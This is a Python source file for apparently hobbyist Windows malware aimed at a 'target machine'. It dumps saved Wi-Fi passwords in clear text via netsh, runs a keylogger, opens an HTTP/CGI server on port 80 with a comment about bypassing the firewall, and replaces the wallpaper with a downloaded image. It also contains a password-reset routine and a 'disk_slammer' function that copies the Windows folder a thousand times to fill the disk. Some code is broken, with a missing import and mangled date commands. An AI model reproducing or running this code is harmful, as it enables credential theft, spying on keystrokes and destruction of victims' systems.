import os # grabbing the system operating system
import sys # identifying the system-specific parameters and functions
import ctypes #ctypes for wallpaper changes
import time #time can be used for delays and cycle changes
import shutil #copying files
import socket #Starting up a webserver
import urllib.request #Downloading files from web
from win32com import adsi #for setting password
import subprocess


#GLOBAL VARIABLES
dir_path = "C:\WindowsLogs"


#background is to set background of target machine
def background():
    url = "https://raw.githubusercontent.com/kamilgrudzien/JoKEr/main/v33r1.png"
    urllib.request.urlretrieve(url, "C:/WindowsLogs/veer.png")
    #SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:/WindowsLogs/veer.png", 0)

#grabs the computer name and IP Address for the PC
def ip_address():
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    f = open("Ip_address.txt", "a")
    print("Your attacking Computer Name is:" + hostname, file=f)
    print("Your attacking Computer IP Address is:" + IPAddr, file=f)
    f.close()    

#copies folder
def copy_folder(source,target):
    if os.path.isdir(target):
        print("Folder Exists")
    else:
        shutil.copytree(source, target)
        print("Folder Copied")

#copies files
def copy_file(source,target):
    if os.path.isfile(target):
        print("Files Exists")
    else:
        shutil.copytree(source, target)
        print("Files Copied")
    
#creates directory to store malware data
def dir_create():
    #mode 0o777 allows for permissions to RWE
    if not os.path.isdir(dir_path):
        os.mkdir(dir_path,mode = 0o777)
    else:
        print('The directory is present.')
        
#spins up a server on port 80
#windows firewall catches this action, which we need to bypass
def run_server():
    from http.server import HTTPServer, CGIHTTPRequestHandler
    os.chdir('.')
    server_object = HTTPServer(server_address=('0.0.0.0', 80), RequestHandlerClass=CGIHTTPRequestHandler)
    server_object.serve_forever()
    
#grabs credentials of any connected wifi networks
def wifi_creds():
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    f = open("C:/WindowsLogs/WiFi.txt", "a")
    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            print ("{:<30}|  {:<}".format(i, results[0]), file=f)
        except IndexError:
            print ("{:<30}|  {:<}".format(i, ""),file=f)
    f.close()
    
def winTimeSet():
    os.system("date"+str(4-20-2020))
    os.system("time"+str(6-6-6-66))
    
#Key logger to see all of the user keyboard inputs
def key_logger():
    from pynput.keyboard import Key, Listener
    import logging
    
    f = open("keylogs.txt", "a")
    log_dir = ""
    logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s:%(message)a')
    def on_press(key):
        logging.info(str(key))
    with Listener(on_press=on_press) as listener:
        listener.join()
    f.close()
    
def set_password(username, password):
    from win32com import adsi
    ads_obj = adsi.ADsGetObject("WinNT://localhost/%s,user" % username)
    ads_obj.Getinfo()
    ads_obj.SetPassword(password)
   
def verify_password_change(username, password):
    from win32security import LogonUser
    from win32con import LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT
    try:
        LogonUser(username, None, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT)
    except:
        return False
    return True

def disk_slammer():
    for i in range(1000):
        new_folder = "C:/" + str(i)
        copy_folder("C:/Windows",new_folder)
    
    

def main():
    from multiprocessing import Process
    multiprocessing.freeze_support()
    p1 = Process(target = run_server)
    print("server running")
    p1.start()
    p2 = Process(target = key_logger)
    print("logger running")
    p2.start()
    
    dir_create()
    print("Directory successfully created")
    background()
    print("Wallpaper successfully applied")
    ip_address()
    copy_folder("C:/WindowsLogs/","C:/test/")
    wifi_creds()
    
    #set_password("Test","Password123")
    #if verify_password_change("Test","Password123"):
    #    print("Password Changed Successfully")
    #else:
    #    print("BUSTED CODE")
    
    

if __name__ == "__main__":
    main ()
